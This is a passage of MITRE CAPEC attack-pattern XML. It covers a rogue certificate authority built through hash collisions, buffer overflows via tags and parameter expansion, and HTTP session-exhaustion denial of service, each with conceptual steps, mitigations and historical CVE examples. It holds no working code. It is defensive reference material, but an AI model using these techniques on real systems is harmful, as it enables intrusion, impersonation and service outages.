            <ns0:Indicator>An adversary creating or modifying Symbolic links is a potential signal of attack in progress.</ns0:Indicator>
            <ns0:Indicator>An adversary deleting temporary files can also be a sign that the adversary is trying to replace legitimate resources with malicious ones.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Pay attention to the fact that the resource you read from can be a replaced by a Symbolic link. You can do a Symlink check before reading the file and decide that this is not a legitimate way of accessing the resource.</ns0:Mitigation>
            <ns0:Mitigation>Because Symlink can be modified by an adversary, make sure that the ones you read are located in protected directories.</ns0:Mitigation>
            <ns0:Mitigation>Pay attention to the resource pointed to by your symlink links (See attack pattern named "Forced Symlink race"), they can be replaced by malicious resources.</ns0:Mitigation>
            <ns0:Mitigation>Always check the size of the input data before copying to a buffer.</ns0:Mitigation>
            <ns0:Mitigation>Use a language or compiler that performs automatic bounds checking.</ns0:Mitigation>
            <ns0:Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Use OS-level preventative functionality. Not a complete solution.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>The EFTP server has a buffer overflow that can be exploited if an adversary uploads a .lnk (link) file that contains more than 1,744 bytes. This is a classic example of an indirect buffer overflow. First the adversary uploads some content (the link file) and then the adversary causes the client consuming the data to be exploited. In this example, the ls command is exploited to compromise the server software.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="285" />
            <ns0:Related_Weakness CWE_ID="302" />
            <ns0:Related_Weakness CWE_ID="118" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Indicators, Mitigations, Prerequisites, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="459" Name="Creating a Rogue Certification Authority Certificate" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary exploits a weakness resulting from using a hashing algorithm with weak collision resistance to generate certificate signing requests (CSR) that contain collision blocks in their "to be signed" parts. The adversary submits one CSR to be signed by a trusted certificate authority then uses the signed blob to make a second certificate appear signed by said certificate authority. Due to the hash collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate. The net effect is that the adversary's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Alternatively, the second certificate could be a signing certificate. Thus the adversary is able to start their own Certification Authority that is anchored in its root of trust in the legitimate Certification Authority that has signed the attacker's first X.509 certificate. If the original Certificate Authority was accepted by default by browsers, so will the Certificate Authority set up by the adversary and any certificates that it signs. As a result, the adversary is able to generate any SSL certificates to impersonate any web server, and the user's browser will not issue any warning to the victim. This can be used to compromise HTTPS communications and other types of systems where PKI and X.509 certificates may be used (e.g., VPN, IPSec).</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft Certificates] The adversary crafts two different, but valid X.509 certificates that when hashed with an insufficiently collision resistant hashing algorithm would yield the same value.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Send CSR to Certificate Authority] The adversary sends the CSR for one of the certificates to the Certification Authority which uses the targeted hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the adversary which is signed with its private key.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Insert Signed Blob into Unsigned Certificate] The adversary takes the signed blob and inserts it into the second X.509 certificate that the attacker generated. Due to the hash collision, both certificates, though different, hash to the same value and so the signed blob is valid in the second certificate. The result is two certificates that appear to be signed by a valid certificate authority despite only one having been signed.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Certification Authority is using a hash function with insufficient collision resistance to generate the certificate hash to be signed</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">Understanding of how to force a hash collision in X.509 certificates</ns0:Skill>
            <ns0:Skill Level="High">An attacker must be able to craft two X.509 certificates that produce the same hash value</ns0:Skill>
            <ns0:Skill Level="Medium">Knowledge needed to set up a certification authority</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Knowledge of a certificate authority that uses hashing algorithms with poor collision resistance</ns0:Resource>
            <ns0:Resource>A valid certificate request and a malicious certificate request with identical hash values</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authentication</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Certification Authorities need to stop using deprecated or cryptographically insecure hashing algorithms to hash the certificates that they are about to sign. Instead they should be using stronger hashing functions such as SHA-256 or SHA-512.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:b>MD5 Collisions</html:b>
               <html:p>The MD5 algorithm is not collision resistant, allowing attackers to use spoofing attacks to create rogue certificate Authorities.</html:p>See also: CVE-2004-2761</ns0:Example>
            <ns0:Example>
               <html:b>SHA1 Collisions</html:b>
               <html:p>The SHA1 algorithm is not collision resistant, allowing attackers to use spoofing attacks to create rogue certificate Authorities.</html:p>See also: CVE-2005-4900</ns0:Example>
            <ns0:Example>
               <html:b>PKI Infrastructure vulnerabilities</html:b>
               <html:p>Research has show significant vulnerabilities in PKI infrastructure. Trusted certificate authorities have been shown to use weak hashing algorithms after attacks have been demonstrated against those algorithms. Additionally, reliable methods have been demonstrated for generated MD5 collisions that could be used to generate malicious CSRs.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="327" />
            <ns0:Related_Weakness CWE_ID="295" />
            <ns0:Related_Weakness CWE_ID="290" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-395" />
            <ns0:Reference External_Reference_ID="REF-587" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description Summary</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences, Description, Example_Instances, Likelihood_Of_Attack, Mitigations, Prerequisites, References, Resources_Required, Skills_Required, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Creating a Rogue Certificate Authority Certificate</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="46" Name="Overflow Variables and Tags" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The adversary crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="8" />
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="10" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries look for applications or programs that accept formatted files, such as configuration files, as input.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.</ns0:Description>
               <ns0:Technique>Knowing the type of file that an application takes as input, the adversary takes a normal input file and modifies a single variable or tag to contain a large amount of data. If there is a crash, this means that a buffer overflow attack is possible. The adversary will keep changing single variables or tags one by one until they see a change in behavior.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.</ns0:Description>
               <ns0:Technique>Create malicious shellcode that will execute when the program execution is returned to it.</ns0:Technique>
               <ns0:Technique>Use a NOP-sled in the overflow content to more easily "slide" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] The adversary will upload the crafted file to the application, causing a buffer overflow.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target program consumes user-controllable data in the form of tags or variables.</ns0:Prerequisite>
            <ns0:Prerequisite>The target program does not perform sufficient boundary checking.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Use a language or compiler that performs automatic bounds checking.</ns0:Mitigation>
            <ns0:Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Use OS-level preventative functionality. Not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Do not trust input data from user. Validate all user input.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>A buffer overflow vulnerability exists in the Yamaha MidiPlug that can be accessed via a Text variable found in an EMBED tag.</html:p>See also: CVE-1999-0946</ns0:Example>
            <ns0:Example>
               <html:p>A buffer overflow in Exim allows local users to gain root privileges by providing a long :include: option in a .forward file.</html:p>See also: CVE-1999-0971</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="118" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="733" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="469" Name="HTTP DoS" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.</ns0:Description>
         <ns0:Typical_Severity>Low</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="227" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>HTTP protocol is usedWeb server used is vulnerable to denial of service via HTTP flooding</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>Ability to issues hundreds of HTTP requests</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Mitigations>
            <ns0:Mitigation>Configuration: Configure web server software to limit the waiting period on opened HTTP sessions</ns0:Mitigation>
            <ns0:Mitigation>Design: Use load balancing mechanisms</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
            <ns0:Related_Weakness CWE_ID="772" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499.002</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service: Service Exhaustion Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-406" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="47" Name="Buffer Overflow via Parameter Expansion" Abstraction="Detailed" Status="Draft">
         <ns0:Description>In this attack, the target software is given input that the adversary knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.</ns0:Description>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.</ns0:Description>
               <ns0:Technique>In this attack, the normal method of providing large user input does not work. The program performs bounds checking on the user input, but not the expanded user input. The adversary needs to provide input that they believe will be expanded by the program to overflow a buffer. To identify where this is possible, an adversary either needs to have knowledge of the inner workings of the program or use a disassembler and other reverse engineering tools to guide the search.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft overflow content] The adversary crafts the input to be given to the program. If the intent is to simply cause the software to crash, the input needs only to expand to an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft input that expands in a way that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.</ns0:Description>
               <ns0:Technique>Create specific files and directories on the system and then give input using path traversal shortcuts to those directories that could expand past an input buffer.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Overflow the buffer] Using the injection vector, the adversary gives the crafted input to the program, overflowing the buffer.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The program expands one of the parameters passed to a function with input controlled by the user, but a later function making use of the expanded parameter erroneously considers the original, not the expanded size of the parameter.</ns0:Prerequisite>
            <ns0:Prerequisite>The expanded parameter is used in the context where buffer overflow may become possible due to the incorrect understanding of the parameter size (i.e. thinking that it is smaller than it really is).</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">Finding this particular buffer overflow may not be trivial. Also, stack and especially heap based buffer overflows require a lot of knowledge if the intended goal is arbitrary code execution. Not only that the adversary needs to write the shell code to accomplish their goals, but the adversary also needs to find a way to get the program execution to jump to the planted shell code. There also needs to be sufficient room for the payload. So not every buffer overflow will be exploitable, even by a skilled adversary.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Ensure that when parameter expansion happens in the code that the assumptions used to determine the resulting size of the parameter are accurate and that the new size of the parameter is visible to the whole system</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Attack Example: FTP glob()</html:p>
               <html:p>The glob() function in FTP servers has been susceptible to attack as a result of incorrect resizing. This is an ftpd glob() Expansion LIST Heap Overflow Vulnerability. ftp daemon contains a heap-based buffer overflow condition. The overflow occurs when the LIST command is issued with an argument that expands into an oversized string after being processed by glob().</html:p>
               <html:p>This buffer overflow occurs in memory that is dynamically allocated. It may be possible for adversaries to exploit this vulnerability and execute arbitrary code on the affected host.</html:p>
               <html:p>To exploit this, the adversary must be able to create directories on the target host.</html:p>
               <html:p>The glob() function is used to expand short-hand notation into complete file names. By sending to the FTP server a request containing a tilde (~) and other wildcard characters in the pathname string, a remote adversary can overflow a buffer and execute arbitrary code on the FTP server to gain root privileges. Once the request is processed, the glob() function expands the user input, which could exceed the expected length. In order to exploit this vulnerability, the adversary must be able to create directories on the FTP server.</html:p>
               <html:p>[REF-1]</html:p>See also: CVE-2001-0249</ns0:Example>
            <ns0:Example>
               <html:p>Buffer overflow in the glob implementation in libc in NetBSD-current before 20050914, and NetBSD 2.* and 3.* before 20061203, as used by the FTP daemon, allows remote authenticated users to execute arbitrary code via a long pathname that results from path expansion.</html:p>
               <html:p>The limit computation of an internal buffer was done incorrectly. The size of the buffer in byte was used as element count, even though the elements of the buffer are 2 bytes long. Long expanded path names would therefore overflow the buffer.</html:p>See also: CVE-2006-6652</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="119" />
            <ns0:Related_Weakness CWE_ID="118" />
            <ns0:Related_Weakness CWE_ID="130" />
            <ns0:Related_Weakness CWE_ID="131" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="20" />
